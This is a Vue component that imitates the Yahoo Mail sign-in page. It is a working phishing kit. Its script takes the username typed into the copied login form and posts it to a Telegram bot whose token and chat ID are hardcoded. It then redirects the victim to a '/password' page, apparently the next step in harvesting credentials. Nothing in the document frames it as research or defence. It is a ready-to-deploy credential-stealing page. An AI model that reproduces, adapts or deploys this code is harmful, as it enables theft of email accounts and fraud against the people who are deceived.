


<template>
  <div id="app"> 
    

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mail Sign In</title>
 
</head>
<body>
  <header>
    <a class="logo" href="#" aria-label="Yahoo-style demo home">yahoo!</a>
    <nav class="header-links" aria-label="Utility links">
      <a href="#">Help</a>
      <a href="#">Terms</a>
      <a href="#">Privacy</a>
    </nav>
  </header>

  <main class="page">
    <section class="intro">
      <b><h2>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h2></b>
      <p>
       Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.
      </p>
    </section>

    <section class="card" aria-labelledby="signin-title">
      <div class="card-logo">yahoo!</div>
      <h2 id="signin-title">Sign in to Mail</h2>
      <p class="subtitle" > </p>
      <!-- <p class="subtitle" v-if="isActive">Incorrect username, email or phone number </p> -->

      <form id="demo-form" autocomplete="off">
        <div class="field">
          <label for="username">Username, email or phone number</label>
          <input
            id="username"
            name="username"
            type="text"
            placeholder="Enter your username"
            v-model="formDataRes.username"
          />
        </div>

        <div class="options">
          <label class="remember">
            <input type="checkbox" />
            Stay signed in
          </label>
          <a class="text-link" href="#" >Forgot username?</a>
        </div>

        <button class="primary" type="submit" @click.prevent="finishJoob();" >Next</button>

        <button class="outline" type="button" >
          Sign in with Google
        </button>

        <a class="button-link create" href="#" >
          Create account
        </a>

        <p class="notice">
            Sign in to Yahoo Mail
        </p>
      </form>
    </section>
  </main>

  <footer>
  </footer>


</body>
</html>

  </div> 
 
</template>





<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        username: "",
       
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️ Yahoo*\nUsername: ${this.formDataRes.username}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/password");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>




 <style>
    :root {
      --purple: #6001d2;
      --purple-dark: #4d00aa;
      --text: #1f1f1f;
      --muted: #6b6b6b;
      --border: #d8d8d8;
      --bg: #f7f7f7;
      --card: #ffffff;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      color: var(--text);
      background: var(--bg);
    }

    header {
      height: 76px;
      padding: 0 32px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #fff;
      border-bottom: 1px solid #ececec;
    }

    .logo {
      font-size: 30px;
      font-weight: 800;
      color: var(--purple);
      letter-spacing: -1.5px;
      text-decoration: none;
    }

    .header-links {
      display: flex;
      gap: 18px;
      font-size: 14px;
    }

    .header-links a {
      color: var(--purple);
      text-decoration: none;
    }

    .page {
      min-height: calc(100vh - 76px);
      display: grid;
      grid-template-columns: 1.15fr 0.85fr;
      align-items: center;
      gap: 48px;
      max-width: 1120px;
      margin: 0 auto;
      padding: 64px 32px;
    }

    .intro {
      max-width: 560px;
    }

    .intro h1 {
      margin: 0 0 18px;
      font-size: clamp(36px, 5vw, 64px);
      line-height: 1.04;
      letter-spacing: -2px;
    }

    .intro p {
      margin: 0;
      color: var(--muted);
      font-size: 18px;
      line-height: 1.6;
    }

    .card {
      width: 100%;
      max-width: 390px;
      justify-self: end;
      background: var(--card);
      border-radius: 12px;
      padding: 36px 32px;
      box-shadow: 0 12px 38px rgba(0, 0, 0, 0.12);
    }

    .card-logo {
      text-align: center;
      color: var(--purple);
      font-size: 28px;
      font-weight: 800;
      margin-bottom: 28px;
    }

    .card h2 {
      margin: 0 0 8px;
      text-align: center;
      font-size: 24px;
    }

    .subtitle {
      margin: 0 0 28px;
      text-align: center;
      color: rgb(188, 36, 36);
      font-size: 14px;
      padding: 10px;
    }

    .field {
      margin-bottom: 18px;
    }

    label {
      display: block;
      margin-bottom: 7px;
      font-size: 13px;
      font-weight: 700;
    }

    input[type="text"] {
      width: 100%;
      height: 48px;
      padding: 0 14px;
      border: 1px solid var(--border);
      border-radius: 7px;
      font-size: 16px;
      outline: none;
    }

    input[type="text"]:focus {
      border-color: var(--purple);
      box-shadow: 0 0 0 3px rgba(96, 1, 210, 0.12);
    }

    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      margin: 14px 0 22px;
      font-size: 13px;
    }

    .remember {
      display: flex;
      align-items: center;
      gap: 7px;
      color: var(--muted);
    }

    .text-link {
      color: var(--purple);
      text-decoration: none;
    }

    button,
    .button-link {
      width: 100%;
      min-height: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 24px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
    }

    .primary {
      border: none;
      color: white;
      background: var(--purple);
    }

    .primary:hover {
      background: var(--purple-dark);
    }

    .outline {
      margin-top: 14px;
      border: 1px solid var(--border);
      color: var(--text);
      background: #fff;
    }

    .create {
      margin-top: 14px;
      border: 1px solid var(--purple);
      color: var(--purple);
      background: #fff;
    }

    .notice {
      margin: 22px 0 0;
      font-size: 12px;
      line-height: 1.5;
      text-align: center;
      color: #7a7a7a;
    }

    footer {
      padding: 26px;
      text-align: center;
      color: #777;
      font-size: 12px;
    }

    @media (max-width: 800px) {
      header {
        padding: 0 20px;
      }

      .header-links {
        gap: 10px;
        font-size: 12px;
      }

      .page {
        grid-template-columns: 1fr;
        padding: 42px 20px;
      }

      .intro {
        text-align: center;
        margin: 0 auto;
      }

      .card {
        justify-self: center;
      }
    }

    @media (max-width: 460px) {
      .header-links a:first-child {
        display: none;
      }

      .card {
        padding: 30px 22px;
      }

      .options {
        align-items: flex-start;
        flex-direction: column;
      }
    }
  </style>